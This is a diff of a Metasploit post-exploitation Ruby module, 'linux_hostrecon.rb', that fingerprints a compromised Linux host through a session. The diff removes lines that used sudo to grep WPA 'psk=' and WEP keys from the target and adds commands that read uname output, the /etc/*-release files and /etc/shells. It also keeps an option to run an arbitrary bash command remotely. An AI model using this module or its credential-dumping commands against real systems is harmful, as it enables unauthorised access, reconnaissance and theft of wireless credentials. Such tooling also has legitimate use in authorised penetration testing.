@@ -11,6 +11,7 @@
 # [ linux_hostrecon.rb - target fingerprints post-module ]
 # Author: pedr0 Ubuntu [r00t-3xp10it]
 # tested on: linux Kali 2.0
+# P.O.C https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC[ERB]/metasploit-API/writing_a_linux_post_module_from_scratch.md
 #
 #
 # [ POST-EXPLOITATION MODULE DESCRIPTION ]
@@ -24,7 +25,7 @@
 # The session number to run this module on       => set SESSION 3
 # Store dumped data to msf4/loot folder?         => set STORE_LOOT true
 # Agressive system fingerprints scan?            => set AGRESSIVE_DUMP true
-# Execute a bash command and display output?     => set SINGLE_COMMAND uname -a
+# The bash command to execute remotly            => set SINGLE_COMMAND uname -a
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -130,14 +131,10 @@ class MetasploitModule < Msf::Post
                         [
                                 OptBool.new('STORE_LOOT', [false, 'Store dumped data to msf4/loot folder?', false]),
                                 OptBool.new('AGRESSIVE_DUMP', [false, 'Agressive system fingerprints scan?', false]),
-                                OptString.new('SINGLE_COMMAND', [false, 'Execute a bash command and display output?'])
+                                OptString.new('SINGLE_COMMAND', [false, 'The bash command to execute remotly'])
                         ], self.class)
  
         end
-
-
-
-
 
 
 #
@@ -207,19 +204,27 @@ def run
       # Dump system information from target system (fingerprints)
       #
       data_dump=''
+      print_status("Executing list of commands remotlly ..")
       # bash commands to be executed remotlly ..
-      dat_out = cmd_exec("date")
-      wpa_out = cmd_exec("sudo grep psk= #{rpath}/*")
-      wep_out = cmd_exec("sudo grep wep-key0= #{rpath}/*")
+      date_out = cmd_exec("date")
+      distro_uname = cmd_exec("uname -a")
+      distro_release = cmd_exec("cat /etc/*-release | grep \"DISTRIB_RELEASE=\"; cat /etc/*-release | grep \"DISTRIB_DESCRIPTION=\"; cat /etc/*-release | grep \"VERSION_ID=\"; cat /etc/*-release | grep \"ID_LIKE=\"")
+      distro_shells = cmd_exec("cat /etc/shells")
       # store data into a variable to write the logfile ..
-      data_dump << dat_out
+      data_dump << date_out
       data_dump << ""
-      data_dump << "WPA CREDENTIALS:"
+      data_dump << "UNAME:"
       data_dump << "----------------"
-      data_dump << wpa_out
-      data_dump << "WEP CREDENTIALS:"
+      data_dump << distro_uname
+      data_dump << ""
+      data_dump << "RELEASE:"
       data_dump << "----------------"
-      data_dump << wep_out
+      data_dump << distro_release
+      data_dump << ""
+      data_dump << "AVAILABLE SHELLS:"
+      data_dump << "----------------"
+      data_dump << distro_shells
+      data_dump << ""
       Rex::sleep(1.0)
 
         #
@@ -235,6 +240,7 @@ def run
           data_dump << "LIST OF ESSIDs EMITING:"
           data_dump << "-----------------------"
           data_dump << essid_out
+          data_dump << ""
         end
 
           #
